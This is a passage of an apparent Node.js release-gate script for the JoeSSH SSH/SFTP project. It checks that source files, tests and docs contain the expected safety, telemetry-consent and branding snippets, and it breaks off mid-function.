        "term.resize(next.cols, next.rows)",
        "resize(next.cols, next.rows)",
        "statusLabels.reconnect",
        "statusLabels.blocked",
        'role={pty.blockedReason !== null ? "alert" : "status"}',
        "Terminal exited",
      ],
    ],
    [
      "Desktop xterm PTY runtime tests",
      "apps/desktop/src/XtermTerminal.test.tsx",
      [
        "resizes the existing terminal and PTY when the container changes size",
        "shows exit status and reconnects the PTY without rebuilding xterm",
        "shows native PTY command blocks as an assertive status without closing the terminal",
        "first.deps.open).toHaveBeenCalledTimes(2)",
      ],
    ],
    [
      "Desktop PTY hook tests",
      "apps/desktop/src/usePtySession.test.ts",
      [
        "moves to closed when the pty emits exit",
        "result.current.exitCode",
        "forwards write and resize to the open pty",
        "surfaces native PTY command blocks and clears them after a safe write",
      ],
    ],
  ];

  for (const [label, relativePath, snippets] of requiredSnippetsByFile) {
    const text = readTextIfExists(relativePath);
    passIf(text !== null, `${label} exists`, relativePath);
    if (text === null) {
      continue;
    }
    for (const snippet of snippets) {
      passIf(text.includes(snippet), `${label} includes '${snippet}'`);
    }
  }
}

function checkDesktopSftpSafetySurface() {
  const requiredSnippetsByFile = [
    [
      "Desktop SFTP overwrite confirmation UX",
      "apps/desktop/src/panels.tsx",
      [
        "pendingUpload",
        "directoryPath",
        "desktop.sftpOverwriteTitle",
        "desktop.sftpOverwriteDetail",
        "desktop.sftpOverwriteConfirm",
        "desktop.sftpOverwriteCancel",
        "transfer?.onUpload(pendingUpload.file, pendingUpload.directoryPath)",
      ],
    ],
    [
      "Desktop SFTP overwrite confirmation tests",
      "apps/desktop/src/panels.test.tsx",
      [
        "requires confirmation before overwriting an existing SFTP file",
        "Replace existing file?",
        "A file named app.log already exists in this folder.",
        "Overwrite",
        "clears pending SFTP overwrite confirmation when the directory changes",
      ],
    ],
    [
      "Desktop SFTP remote path safety helpers",
      "apps/desktop/src/sftpRemotePath.ts",
      [
        "normalizeSftpRemotePath",
        "joinSftpRemotePath",
        "isSafeSftpEntryName",
        "joinSftpRemoteEntryPath",
        "UNSAFE_ENTRY_NAME_PATTERN",
        "parentSftpRemotePath",
      ],
    ],
    [
      "Desktop SFTP remote path safety tests",
      "apps/desktop/src/useSftpDirectory.test.ts",
      [
        "joinSftpRemotePath builds stable file payload paths",
        "validates SFTP listing entry names before using them as path segments",
        "joinSftpRemoteEntryPath refuses names that escape the current directory",
        "normalizes opened paths before reloading",
        "keeps slow stale directory listings from overwriting the current path",
        "file name #1.txt",
      ],
    ],
    [
      "Desktop SFTP transfer resource limit hook",
      "apps/desktop/src/useSftpTransfer.ts",
      [
        "SFTP_TRANSFER_MAX_BYTES",
        "knownSizeBytes",
        "rejectTooLarge",
        "data.length > maxBytes",
      ],
    ],
    [
      "Desktop SFTP transfer resource limit tests",
      "apps/desktop/src/useSftpTransfer.test.ts",
      [
        "rejects downloads with known sizes over the transfer limit before reading",
        "rejects downloaded payloads over the transfer limit",
        "rejects upload payloads over the transfer limit before writing",
      ],
    ],
    [
      "Desktop SFTP transfer resource limit app wiring",
      "apps/desktop/src/main.tsx",
      [
        "SFTP_TRANSFER_MAX_BYTES",
        "desktop.sftpTransferTooLarge",
        "knownSizeBytes: size",
        "file.size > SFTP_TRANSFER_MAX_BYTES",
        "joinSftpRemoteEntryPath(directoryPath, name)",
        "joinSftpRemoteEntryPath(directoryPath, file.name)",
      ],
    ],
    [
      "Desktop SFTP transfer resource limit backend",
      "apps/desktop/src-tauri/src/lib.rs",
      [
        "SFTP_MAX_TRANSFER_BYTES",
        "SFTP_TRANSFER_LIMIT_EXCEEDED",
        "SFTP_REMOTE_PATH_UNSAFE",
        "normalize_sftp_remote_path(&path)?",
        "download_limited(&path, SFTP_MAX_TRANSFER_BYTES)",
        "sanitize_sftp_transfer_error",
        "ensure_sftp_transfer_size(data.len())",
        "sftp_remote_path_guard_rejects_unsafe_paths",
        "sftp_transfer_errors_use_sftp_limit_copy",
        "sftp_transfer_size_guard_rejects_oversized_payloads",
      ],
    ],
    [
      "Desktop SFTP backend entry-name guard",
      "crates/core/src/ssh.rs",
      [
        "is_safe_sftp_entry_name",
        "UNSAFE_SFTP_ENTRY_FORMAT_RANGES",
        "filter_map(|entry|",
        "sftp_entry_name_guard_rejects_paths_and_control_characters",
        "safe\\u{202e}cod.exe",
      ],
    ],
  ];

  for (const [label, relativePath, snippets] of requiredSnippetsByFile) {
    const text = readTextIfExists(relativePath);
    passIf(text !== null, `${label} exists`, relativePath);
    if (text === null) {
      continue;
    }
    for (const snippet of snippets) {
      passIf(text.includes(snippet), `${label} includes '${snippet}'`);
    }
  }
}

function checkDesktopForwardingRuntimeSurface() {
  const requiredSnippetsByFile = [
    [
      "Desktop forwarding single-flight runtime hook",
      "apps/desktop/src/useForwardRules.ts",
      [
        "pending?: boolean",
        "inFlightRules",
        "runtimeRef",
        "backendSeq",
        "inFlightRules.current.has(id)",
        "inFlightRules.current.set(id, operationId)",
        "inFlightRules.current.get(id) === operationId",
        "inFlightRules.current.delete(id)",
        "void stop(forwardId).catch(() => {})",
      ],
    ],
    [
      "Desktop forwarding single-flight tests",
      "apps/desktop/src/useForwardRules.test.ts",
      [
        "ignores duplicate start calls while a forward is pending",
        "ignores duplicate stop calls while a forward stop is pending",
        "stops active native forwards and clears runtime state when the backend session changes",
        "ignores stale start results after the backend session changes",
        "toHaveBeenCalledTimes(1)",
      ],
    ],
    [
      "Desktop forwarding pending action UX",
      "apps/desktop/src/panels.tsx",
      [
        "const isPending = Boolean(rt?.pending)",
        "disabled={!forwards || isPending}",
      ],
    ],
    [
      "Desktop forwarding pending action tests",
      "apps/desktop/src/panels.test.tsx",
      [
        "disables forwarding controls while a start or stop action is pending",
        "pending: true",
      ],
    ],
  ];

  for (const [label, relativePath, snippets] of requiredSnippetsByFile) {
    const text = readTextIfExists(relativePath);
    passIf(text !== null, `${label} exists`, relativePath);
    if (text === null) {
      continue;
    }
    for (const snippet of snippets) {
      passIf(text.includes(snippet), `${label} includes '${snippet}'`);
    }
  }
}

function checkReleaseDocs() {
  const requiredDocs = [
    [
      "Public Beta dogfood script",
      "docs/public-beta-dogfood-script.md",
      [
        "Top 10 Tasks",
        "desktop-install-launch",
        "desktop-connection-host-key",
        "desktop-pty-session",
        "desktop-command-safety",
        "desktop-sftp-transfer",
        "desktop-forwarding",
        "web-admin-live-sync",
        "sync-device-flow",
        "sync-backup-restore-rollback",
        "release-evidence-review",
        "unsigned internal staging",
        "signed Desktop formal release evidence",
        "release:desktop:unsigned-staging-report",
        "reports/handoff/desktop/unsigned-staging-report.json",
        "qa:public-beta-dogfood",
        "reports/dogfood/public-beta/latest.json",
      ],
    ],
    [
      "Release checklist",
      "docs/release-checklist.md",
      [
        "Public Beta",
        "docs/repository-release-handoff.md",
        "SBOM",
        "SHA256",
        "SBOM-SHA256SUMS.txt",
        "cargo-workspace-sbom.cdx.json",
        "tauri-cargo-sbom.cdx.json",
        "THIRD-PARTY-LICENSES-SHA256SUMS.txt",
        "release:third-party-licenses:verify",
        "release-evidence.json",
        "release-evidence-source.json",
        "release-evidence-SHA256SUMS.txt",
        "reports/handoff/desktop/formal-evidence-unblock-report.json",
        "release-provenance.json",
        "release-provenance-SHA256SUMS.txt",
        "artifact sha256",
        "manifest hash",
        "staged",
        "cargo-audit",
        "qa:rust-advisory",
        "qa:release:public:fixture",
        "qa:lighthouse",
        "release:publish-preflight",
        "backup-restore-smoke.json",
        "qa:sync:backup-restore-smoke",
        "unknown-host fingerprint",
        "changed-host-key blocking",
        "per-host known",
        "runtime telemetry",
        "rollback",
      ],
    ],
    [
      "Repository release handoff playbook",
      "docs/repository-release-handoff.md",
      [
        "healthy Git checkout",
        "do not publish from the damaged workspace",
        "git status --short",
        "git fsck --strict",
        "git diff --binary",
        "release-provenance.json",
        "THIRD-PARTY-LICENSES-SHA256SUMS.txt",
        "release:third-party-licenses:verify",
        "npm run qa:release:public",
        "npm run qa:release:public:fixture",
        "release-evidence-source.json",
        "reports/handoff/desktop/formal-evidence-unblock-report.json",
        "node scripts/check-public-release-readiness.mjs",
        expectedReleaseTag,
      ],
    ],
    [
      "Third-party notices overview",
      "THIRD_PARTY_NOTICES.md",
      [
        "release:third-party-licenses",
        "release:third-party-licenses:verify",
        "reports/internal/release-inputs/",
        "cargo-workspace-sbom.cdx.json",
        "tauri-cargo-sbom.cdx.json",
        "THIRD-PARTY-LICENSES-SHA256SUMS.txt",
        "legal/THIRD-PARTY-NOTICES.txt",
        "release:desktop:legal-resource",
        "complete root `LICENSE`",
      ],
    ],
    [
      "Public Beta release notes",
      `docs/release-notes/${expectedVersion}.md`,
      [
        expectedVersion,
        "Desktop",
        "Web Admin",
        "Sync Service",
        "SHA256",
        "release:publish-preflight",
      ],
    ],
    [
      "Desktop distribution guide",
      "docs/desktop-distribution.md",
      [
        "Windows",
        "sign",
        "notarization",
        "Linux",
        "release-evidence.json",
        "release-evidence-source.json",
        "release-evidence-SHA256SUMS.txt",
        "reports/handoff/desktop/formal-evidence-unblock-report.json",
        "artifact sha256",
        "manifest hash",
        "staged",
        "desktop-release-metadata.json",
        "capabilities",
        "permissions",
        "pre-auth host-key probe",
        "known-host list/remove/clear",
        "unknown hosts require a visible fingerprint confirmation",
        "changed host keys are blocked",
        "first/last seen metadata",
        "1 MiB",
        "25 MiB bounded SFTP transfer",
      ],
    ],
    [
      "Web Admin deployment guide",
      "docs/web-admin-deployment.md",
      [
        "_headers",
        "CSP",
        "VITE_ATLASTERM_ADMIN_SNAPSHOT_URL",
        "joessh-web-admin",
        "verify-web-release-package.mjs",
        ".well-known/security.txt",
        "node-admin-snapshot-proxy.mjs",
        "ATLASTERM_WEB_ADMIN_PROXY_ALLOW_PUBLIC_BIND",
        "ATLASTERM_WEB_ADMIN_PROXY_OPERATOR_TOKEN",
        "qa:web-admin-proxy-smoke",
        "qa:lighthouse",
        "qa:web-admin-sync-topology-smoke",
        "qa:web-admin-sync-topology-release-smoke",
      ],
    ],
    [
      "Sync self-hosting guide",
      "docs/self-hosting-sync.md",
      [
        "ATLASTERM_SYNC_AUTH_TOKEN",
        "ATLASTERM_SYNC_METRICS_TOKEN",
        "ATLASTERM_SYNC_ALLOW_EPHEMERAL_STORAGE",
        "32 characters",
        "/readyz",
        "/metrics",
        "schema_version: 1",
        "qa:sync:config-guard-smoke",
        "ledger.lock",
        "joessh_sync_storage_write_failures_total",
        "qa:sync:backup-restore-smoke",
        "RPO",
        "RTO",
        "systemd",
        "Docker",
        "HEALTHCHECK",
        "Authorization: Bearer ${ATLASTERM_SYNC_METRICS_TOKEN}",
        "qa:sync-release-package",
        "qa:sync:release-smoke",
      ],
    ],
    [
      "Dependency risk register",
      "docs/dependency-risk-register.md",
      ["uuid", "GHSA-w5hq-g745-h8pq", "@expo/config-plugins", "xcode"],
    ],
    [
      "Public Beta privacy note",
      "docs/privacy-public-beta.md",
      ["opt-in", "SSH host", "token", "runtime", "install cleanup"],
    ],
  ];

  for (const [label, relativePath, requiredText] of requiredDocs) {
    const text = readTextIfExists(relativePath);
    passIf(text !== null, `${label} exists`, relativePath);
    if (text !== null) {
      for (const value of requiredText) {
        passIf(text.includes(value), `${label} mentions '${value}'`);
      }
    }
  }
}

function checkPublicFacingBranding() {
  const requiredText = [
    [
      "README",
      "README.md",
      [
        "JoeSSH",
        "React Native/Expo sync preview shell",
        "does not currently provide public mobile SSH/SFTP or emergency-access execution",
        "Read-only Web Admin viewer",
        "Hosted SaaS and mutating team operations are not currently shipped",
        "npm run qa:prod-audit",
        "does not currently provide end-to-end payload encryption",
      ],
    ],
    [
      "Web Admin README",
      "apps/web/README.md",
      [
        "read-only viewer",
        "does not currently ship mutating admin operations, billing, or hosted SaaS",
      ],
    ],
    [
      "Web Admin manifest",
      "apps/web/public/manifest.json",
      [
        "Read-only team, device, role, and audit snapshots from a configured JoeSSH Sync service.",
      ],
    ],
    [
      ".env example",
      ".env.example",
      [
        "JoeSSH Environment Variables",
        "public mobile beta builds",
        "ATLASTERM_SYNC_METRICS_TOKEN",
        "ATLASTERM_SYNC_STORAGE_PATH",
        "ATLASTERM_SYNC_ALLOW_EPHEMERAL_STORAGE",
      ],
    ],
    ["License", "LICENSE", ["JoeSSH contributors"]],
    [
      "Sync Cargo metadata",
      "services/sync/Cargo.toml",
      ['description = "JoeSSH sync service API'],
    ],
    [
      "Desktop llms.txt",
      "apps/desktop/public/llms.txt",
      ["# JoeSSH Workbench", "JoeSSH is a local-first remote workbench"],
    ],
    ["Desktop humans.txt", "apps/desktop/public/humans.txt", ["JoeSSH Team"]],
    ["Web humans.txt", "apps/web/public/humans.txt", ["JoeSSH Team"]],
    [
      "Web service worker",
      "apps/web/public/sw.js",
      ['const CACHE_NAME = "joessh-admin-v3";'],
    ],
    [
      "Desktop service worker",
      "apps/desktop/public/sw.js",
      ['const CACHE_NAME = "joessh-v3";'],
    ],
    ["Architecture", "ARCHITECTURE.md", ["npm run qa:prod-audit"]],
  ];

  for (const [label, relativePath, snippets] of requiredText) {
    const text = readTextIfExists(relativePath);
    passIf(text !== null, `${label} public release text exists`, relativePath);
    if (text === null) {
      continue;
    }
    for (const snippet of snippets) {
      passIf(
        text.includes(snippet),
        `${label} public release text mentions '${snippet}'`,
      );
    }
  }

  const forbiddenText = [
    [
      "README",
      "README.md",
      [
        "github.com/atlasterm/atlasterm",
        "Team/admin console skeleton",
        "Web Admin console",
        "Mobile emergency SSH/SFTP",
        "npm audit + audit-ci",
        "encrypted sync",
        "鈥",
        "�",
      ],
    ],
    [
      "Web Admin manifest",
      "apps/web/public/manifest.json",
      ["Team management, audit views, and sync operations."],
    ],
    [".env example", ".env.example", ["AtlasTerm Environment Variables"]],
    ["License", "LICENSE", ["Copyright (c) 2026 AtlasTerm"]],
    [
      "Sync Cargo metadata",
      "services/sync/Cargo.toml",
      ['description = "AtlasTerm'],
    ],
    [
      "Desktop llms.txt",
      "apps/desktop/public/llms.txt",
      ["AtlasTerm Workbench", "AtlasTerm is"],
    ],
    [
      "Desktop humans.txt",
      "apps/desktop/public/humans.txt",
      ["AtlasTerm Team"],
    ],
    ["Web humans.txt", "apps/web/public/humans.txt", ["AtlasTerm Team"]],
    [
      "Web service worker",
      "apps/web/public/sw.js",
      ["atlasterm-admin-v1", "joessh-admin-v2"],
    ],
    [
      "Desktop service worker",
      "apps/desktop/public/sw.js",
      ["atlasterm-v1", "joessh-v2"],
    ],
    ["Architecture", "ARCHITECTURE.md", ["npm audit + audit-ci"]],
  ];

  for (const [label, relativePath, snippets] of forbiddenText) {
    const text = readTextIfExists(relativePath);
    if (text === null) {
      continue;
    }
    for (const snippet of snippets) {
      passIf(
        !text.includes(snippet),
        `${label} public release text avoids stale '${snippet}'`,
      );
    }
  }
}

function checkSyncDistributionFiles() {
  const webAdminProxy = readTextIfExists(
    "deploy/web-admin/node-admin-snapshot-proxy.mjs",
  );
  passIf(webAdminProxy !== null, "Web Admin production proxy example exists");
  if (webAdminProxy !== null) {
    passIf(
      webAdminProxy.includes("ATLASTERM_WEB_ADMIN_PROXY_ALLOW_PUBLIC_BIND") &&
        webAdminProxy.includes("ATLASTERM_WEB_ADMIN_PROXY_OPERATOR_TOKEN") &&
        webAdminProxy.includes("isAuthorizedBearer") &&
        webAdminProxy.includes("timingSafeEqual") &&
        webAdminProxy.includes("isLoopbackHost"),
      "Web Admin proxy rejects public binds without explicit opt-in, operator auth, and constant-time token comparison",
    );
    passIf(
      webAdminProxy.includes("ATLASTERM_ADMIN_SNAPSHOT_PROXY_MAX_BYTES") &&
        webAdminProxy.includes("readUpstreamTextWithLimit") &&
        webAdminProxy.includes("content-length") &&
        webAdminProxy.includes("upstream_snapshot_too_large") &&
        webAdminProxy.includes("UpstreamSnapshotTooLargeError"),
      "Web Admin proxy caps upstream admin snapshot response bytes before forwarding",
    );
  }
  const webAdminProxySmoke = readTextIfExists(
    "scripts/smoke-web-admin-proxy.mjs",
  );
  passIf(
    webAdminProxySmoke?.includes("assertPublicBindFailsClosed") &&
      webAdminProxySmoke.includes("assertPublicBindRequiresOperatorToken") &&
      webAdminProxySmoke.includes(
        "assertPublicBindRequiresOperatorAuthorization",
      ) &&
      webAdminProxySmoke.includes(
        "ATLASTERM_WEB_ADMIN_PROXY_ALLOW_PUBLIC_BIND=1",
      ) &&
      webAdminProxySmoke.includes("assertInvalidMaxBytesConfigFails") &&
      webAdminProxySmoke.includes("assertProxyRejectsOversizedSnapshot") &&
      webAdminProxySmoke.includes("upstream_snapshot_too_large"),
    "Web Admin proxy smoke covers public-bind startup rejection, operator auth, and oversized upstream snapshots",
  );
  const webAdminSyncTopologySmoke = readTextIfExists(
    "scripts/smoke-web-admin-sync-release-topology.mjs",
  );
  passIf(
    webAdminSyncTopologySmoke?.includes("assertWebDist") &&
      webAdminSyncTopologySmoke.includes("startStaticReleaseServer") &&
      webAdminSyncTopologySmoke.includes("node-admin-snapshot-proxy.mjs") &&
      webAdminSyncTopologySmoke.includes("ATLASTERM_SYNC_CORS_ORIGINS") &&
      webAdminSyncTopologySmoke.includes("assertTopologyEmptySnapshot") &&
      webAdminSyncTopologySmoke.includes("seedSyncData") &&
      webAdminSyncTopologySmoke.includes("/v1/devices/register") &&
      webAdminSyncTopologySmoke.includes("/v1/sync/push") &&
      webAdminSyncTopologySmoke.includes("assertTopologyPopulatedSnapshot") &&
      webAdminSyncTopologySmoke.includes("activeMembers") &&
      webAdminSyncTopologySmoke.includes("healthyDevices") &&
      webAdminSyncTopologySmoke.includes(
        "assertProxyReplacesBrowserAuthorization",
      ) &&
      webAdminSyncTopologySmoke.includes("assertTopologyAdminTokenError"),
    "Web Admin + Sync release topology smoke covers dist, proxy, Sync CORS/auth, empty snapshot, populated snapshot, and error path",
  );
  passIf(
    webAdminSyncTopologySmoke?.includes("--packaged-release") &&
      webAdminSyncTopologySmoke.includes("package-sync-release.mjs") &&
      webAdminSyncTopologySmoke.includes("verify-artifact-checksums.mjs") &&
      webAdminSyncTopologySmoke.includes(
        "reports/release/sync/SHA256SUMS.txt",
      ) &&
      webAdminSyncTopologySmoke.includes(
        "joessh-sync-${version}-${process.platform}-${process.arch}",
      ),
    "Web Admin + Sync release topology smoke supports staged Sync release binary verification",
  );
  const dockerfile = readTextIfExists("services/sync/Dockerfile");
  passIf(dockerfile !== null, "Sync service Dockerfile exists");
  if (dockerfile !== null) {
    passIf(
      dockerfile.includes(
        "ATLASTERM_SYNC_STORAGE_PATH=/var/lib/joessh-sync/ledger.json",
      ),
      "Sync service Dockerfile defaults to durable JSON ledger storage",
    );
    passIf(
      dockerfile.includes('VOLUME ["/var/lib/joessh-sync"]'),
      "Sync service Dockerfile declares the durable ledger volume",
    );
    passIf(
      dockerfile.includes("HEALTHCHECK") &&
        dockerfile.includes("/healthz") &&
        dockerfile.includes("ATLASTERM_SYNC_HEALTHCHECK_PORT"),
      "Sync service Dockerfile declares a container healthcheck",
    );
  }
  passIf(
    existsSync(resolve(root, "services/sync/joessh-sync.service.example")),
    "Sync service systemd example exists",
  );
}

function checkPrivacyPolicy() {
  const text = readTextIfExists("docs/privacy-public-beta.md") ?? "";
  const forbiddenFields = [
    "SSH host",
    "username",
    "command",
    "path",
    "file name",
    "private key",
    "token",
    "terminal output",
  ];
  for (const field of forbiddenFields) {
    passIf(text.includes(field), `Privacy note forbids collecting ${field}`);
  }
  passIf(
    text.includes("Runtime Control Evidence"),
    "Privacy note documents runtime telemetry control evidence",
  );
  passIf(
    text.includes("release readiness gate") &&
      text.includes("runtime telemetry off"),
    "Privacy note aligns runtime telemetry off wording with release readiness gate",
  );
}

function checkTelemetryRuntimeControls() {
  const errorMonitor =
    readTextIfExists("packages/error-monitor/src/index.ts") ?? "";
  const errorMonitorTest =
    readTextIfExists("packages/error-monitor/src/index.test.ts") ?? "";
  const desktopMain = readTextIfExists("apps/desktop/src/main.tsx") ?? "";
  const desktopMainTest =
    readTextIfExists("apps/desktop/src/main.test.tsx") ?? "";
  const webMain = readTextIfExists("apps/web/src/main.tsx") ?? "";
  const webMainTest = readTextIfExists("apps/web/src/main.test.ts") ?? "";

  passIf(errorMonitor.length > 0, "Error monitor runtime source exists");
  passIf(errorMonitorTest.length > 0, "Error monitor runtime tests exist");
  passIf(desktopMain.length > 0, "Desktop app shell source exists");
  passIf(desktopMainTest.length > 0, "Desktop app shell tests exist");
  passIf(webMain.length > 0, "Web app shell source exists");
  passIf(webMainTest.length > 0, "Web app shell tests exist");

  if (errorMonitor.length > 0) {
    passIf(
      hasRuntimeTelemetryControlApi(errorMonitor),
      "Error monitor exposes runtime telemetry disable/consent control",
      "expected disableTelemetry, setTelemetryEnabled, setTelemetryConsent, updateTelemetryConsent, revokeTelemetryConsent, disable, shutdown, dispose, or uninstall",
    );
    passIf(
      /removeEventListener\s*\(/.test(errorMonitor) &&
        /clearInterval\s*\(/.test(errorMonitor),
      "Error monitor can revoke installed listeners and timers",
    );
    passIf(
      hasRuntimeTelemetryQueueClear(errorMonitor),
      "Error monitor clears pending telemetry when runtime telemetry is disabled",
      "expected the runtime control path to clear the queue before/while disabling transport",
    );
    passIf(
      hasRuntimeTelemetryTransportGate(errorMonitor),
      "Error monitor gates report or flush on runtime telemetry state",
      "expected report/flush to return before network transport when telemetry is disabled or consent is revoked",
    );
  }

  if (errorMonitorTest.length > 0) {
    passIf(
      hasRuntimeTelemetryDisableTest(errorMonitorTest),
      "Error monitor tests cover runtime telemetry disable",
      "expected a runtime disable/consent test that asserts fetch/sendBeacon is not called after telemetry is turned off",
    );
  }

  checkAppShellRuntimeTelemetryControls(
    "Desktop",
    desktopMain,
    desktopMainTest,
    "VITE_ATLASTERM_TELEMETRY_OPT_IN",
  );
  checkAppShellRuntimeTelemetryControls(
    "Web",
    webMain,
    webMainTest,
    "VITE_ATLASTERM_TELEMETRY_OPT_IN",
  );
}

function checkWebAdminDataMode() {
  const adminData = readTextIfExists("apps/web/src/adminData.ts") ?? "";
  const adminDataTest =
    readTextIfExists("apps/web/src/adminData.test.ts") ?? "";
  const webMain = readTextIfExists("apps/web/src/main.tsx") ?? "";
  const localization = readTextIfExists("apps/web/src/localization.ts") ?? "";
  const localizationTest =
    readTextIfExists("apps/web/src/localization.test.ts") ?? "";
  const deploymentGuide =
    readTextIfExists("docs/web-admin-deployment.md") ?? "";

  passIf(adminData.length > 0, "Web Admin data boundary source exists");
  if (adminData.length > 0) {
    passIf(
      adminData.includes(
        "params.get('adminSnapshot') === 'fixture' ? 'fixture' : 'live'",
      ),
      "Web Admin defaults to live admin snapshots unless fixture is explicit",
    );
    passIf(
      !adminData.includes(
        "params.get('adminSnapshot') === 'live' ? 'live' : 'fixture'",
      ),
      "Web Admin does not default public roots to fixture data",
    );
    passIf(
      adminData.includes("getAdminSnapshotSourceDescriptor") &&
        adminData.includes("snapshotUrl: null") &&
        adminData.includes("source: 'live'"),
      "Web Admin exposes snapshot source descriptor for ops status",
    );
    passIf(
      adminData.includes("ADMIN_SNAPSHOT_MAX_BYTES") &&
        adminData.includes("readResponseJsonWithLimit") &&
        adminData.includes("content-length") &&
        adminData.includes("response.body.getReader") &&
        adminData.includes("Admin snapshot response was too large."),
      "Web Admin live snapshot loader caps response bytes before JSON parsing",
    );
  }

  passIf(
    adminDataTest.includes(
      "getAdminSnapshotSourceDescriptor('?adminSnapshot=fixture')",
    ) &&
      adminDataTest.includes(
        "getAdminSnapshotSourceDescriptor('?adminSnapshot=live')",
      ),
    "Web Admin tests cover live and fixture snapshot source descriptors",
  );
  passIf(
    adminDataTest.includes("oversized admin snapshot content-length") &&
      adminDataTest.includes("oversized streaming admin snapshot bodies") &&
      adminDataTest.includes("Admin snapshot response was too large."),
    "Web Admin tests cover oversized live snapshot body rejection",
  );
  passIf(
    webMain.includes("snapshotStatus") &&
      webMain.includes("web.snapshot.lastRefreshed") &&
      webMain.includes("web.snapshot.lastSuccess") &&
      webMain.includes("getDashboardLastSuccess") &&
      webMain.includes("dashboardStateRef"),
    "Web Admin UI surfaces snapshot health and refresh metadata",
  );
  passIf(
    localization.includes("'web.snapshot.status'") &&
      localization.includes("'web.snapshot.health.ready'") &&
      localization.includes("'web.snapshot.health.error'") &&
      localization.includes(
        "localMessages[locale][key] ?? commonMessages[key]",
      ),
    "Web Admin localization includes snapshot ops status fallback copy",
  );
  passIf(
    localizationTest.includes("web.snapshot.lastRefreshed") &&
      localizationTest.includes("web.snapshot.health.ready"),
    "Web Admin localization tests cover snapshot ops fallback copy",
  );
  passIf(
    deploymentGuide.includes("public root path defaults to live") &&
      deploymentGuide.includes("?adminSnapshot=fixture"),
    "Web Admin deployment docs keep fixture mode explicit",
  );
  passIf(
    deploymentGuide.includes("ATLASTERM_ADMIN_SNAPSHOT_PROXY_MAX_BYTES") &&
      deploymentGuide.includes("upstream_snapshot_too_large") &&
      deploymentGuide.includes("1 MiB"),
    "Web Admin deployment docs describe admin snapshot response byte limits",
  );
}

function checkAppShellRuntimeTelemetryControls(
  label,
  source,
  testSource,
  optInEnvName,
) {
  if (source.length > 0) {
    passIf(
      source.includes(optInEnvName) &&
        source.includes("createNoopErrorMonitor"),
      `${label} app shell keeps telemetry default-off environment fallback`,
      `expected ${optInEnvName} and createNoopErrorMonitor`,
    );
    passIf(
      hasAppShellRuntimeConsentEvidence(source),
      `${label} app shell wires runtime telemetry consent state`,
      "expected storage/event/runtime consent state plus monitor install cleanup or runtime disable API wiring",
    );
  }

  if (testSource.length > 0) {
    passIf(
      hasRuntimeTelemetryDisableTest(testSource),
      `${label} app shell tests cover runtime telemetry off`,
      "expected a runtime telemetry off/consent revoked test that asserts the installed transport is cleaned up or stops network submissions",
    );
  }
}

function hasRuntimeTelemetryControlApi(text) {
  return /\b(?:disableTelemetry|enableTelemetry|setTelemetry(?:Enabled|Consent)|updateTelemetryConsent|revokeTelemetryConsent|setEnabled|disable|shutdown|dispose|uninstall)\b/.test(
    text,
  );
}

function hasFinalSyncReleaseEvidenceVerification(script) {
  const verifierIndex = script.lastIndexOf(
    "node scripts/verify-sync-release-evidence.mjs",
  );
  const localSmokeIndex = script.lastIndexOf("qa:sync:backup-restore-smoke");
  const releaseSmokeIndex = script.lastIndexOf(
    "qa:sync:release-backup-restore-smoke",
  );

  return verifierIndex > localSmokeIndex && verifierIndex > releaseSmokeIndex;
}

function hasRuntimeTelemetryQueueClear(text) {
  const runtimeControlBlock =
    text.match(
      /\b(?:disableTelemetry|setTelemetry(?:Enabled|Consent)|updateTelemetryConsent|revokeTelemetryConsent|setEnabled|disable|shutdown|dispose|uninstall)\b[\s\S]{0,2400}/,
    )?.[0] ?? "";

  return /queue\s*\.\s*splice\s*\(\s*0\b|queue\s*\.\s*length\s*=\s*0/.test(
    runtimeControlBlock,
  );
}

function hasRuntimeTelemetryTransportGate(text) {
  return /\b(?:report|flush)\s*\([^)]*\)\s*{[\s\S]{0,1400}\bif\s*\([^)]*(?:disabled|enabled|consent|optedIn|telemetry)[^)]*\)\s*return\b/i.test(
    text,
  );
}

function hasAppShellRuntimeConsentEvidence(text) {
  const hasRuntimeConsentState =
    /\b(?:localStorage|sessionStorage|BroadcastChannel|storage|telemetryConsent|TelemetryConsent|setTelemetry(?:Enabled|Consent)?|revokeTelemetry|disableTelemetry)\b/.test(
      text,
    );
  const hasInstallCleanup =
    /\b[A-Za-z0-9_]*(?:cleanup|teardown|dispose|shutdown|uninstall)[A-Za-z0-9_]*\s*=\s*[^;\n]*\.install\s*\(/i.test(
      text,
    ) ||
    /\.(?:disable|shutdown|dispose|uninstall|setTelemetry(?:Enabled|Consent))\s*\(/.test(
      text,
    );

  return hasRuntimeConsentState && hasInstallCleanup;
}

function hasRuntimeTelemetryDisableTest(text) {
  const lower = text.toLowerCase();
  const mentionsRuntimeOff =
    /\bruntime\b/.test(lower) &&
    /(?:disable|disabled|telemetry off|turns? telemetry off|opt-out|opt out|consent revoked|revoke|shutdown|dispose|uninstall)/.test(
      lower,
    );
  const assertsNoTransport =
    /(?:fetch|sendbeacon|network|transport)/.test(lower) &&
    /(?:not\.tohavebeencalled|tohavebeencalledtimes\s*\(\s*0\s*\)|tohavebeencalledtimes\s*\(\s*1\s*\)|not\s+to\s+submit|stops? new network submissions|cleans? up)/.test(
      lower,
    );

  return mentionsRuntimeOff && assertsNoTransport;
}

function checkChangelog() {
  const changelog = readText("CHANGELOG.md");
  passIf(
    changelog.includes(`[${expectedVersion}]`),
    "CHANGELOG has Public Beta section",
  );
  passIf(
    !/(?:current\s+)?test count\s*(?:\(\d+\)|to\s+\d+)|100%\s+(?:branch\s+)?coverage|coverage thresholds to 100%/i.test(
      changelog,
    ),
    "CHANGELOG avoids stale fixed test-count or 100% coverage claims",
  );
}

function checkTomlVersion(label, relativePath) {
  const text = readText(relativePath);
  passIf(
    text.includes(`version = "${expectedVersion}"`),
    `${label} version is ${expectedVersion}`,
  );
}

function listTauriCapabilityFiles() {
  const capabilityDir = resolve(root, "apps/desktop/src-tauri/capabilities");
  if (!existsSync(capabilityDir)) {
    return [];
  }

  return readdirSync(capabilityDir, { withFileTypes: true })
    .filter((entry) => entry.isFile() && entry.name.endsWith(".json"))
    .map((entry) => `apps/desktop/src-tauri/capabilities/${entry.name}`)
    .sort();
}

function checkTauriAppCommandPermissionDefinitions(commands) {
  const permissionFiles = listTauriAppPermissionFiles();
  passIf(
    permissionFiles.length > 0,
    "Tauri app command permission definition files exist",
    "expected apps/desktop/src-tauri/permissions/**/*.toml",
  );
  if (permissionFiles.length === 0 || commands.length === 0) {
    return;
  }

  const definitions = new Map();
  const invalidBlocks = [];
  const wildcardFiles = [];
  for (const relativePath of permissionFiles) {
    const text = readText(relativePath);
    if (text.includes("*")) {
      wildcardFiles.push(relativePath);
    }
    for (const definition of parsePermissionDefinitions(
      text,
      relativePath,
